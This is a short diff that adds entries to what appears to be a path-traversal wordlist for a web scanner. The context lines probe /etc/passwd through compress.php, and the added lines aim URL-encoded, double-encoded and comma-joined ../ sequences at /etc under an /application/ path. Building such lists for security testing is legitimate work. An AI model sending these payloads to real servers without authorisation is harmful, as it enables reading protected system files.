@@ -28,3 +28,8 @@
 /compress.php?file=../../../../../../../etc/passwd
 /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
 /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+/application/default
+/application/..%2F..%2F..%2F..%2F..%2Fetc
+/application/..%2F..%2F..%2F..%2F..%2Fetc/main
+/application/..%252F..%252F..%252F..%252F..%252Fetc
+/application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
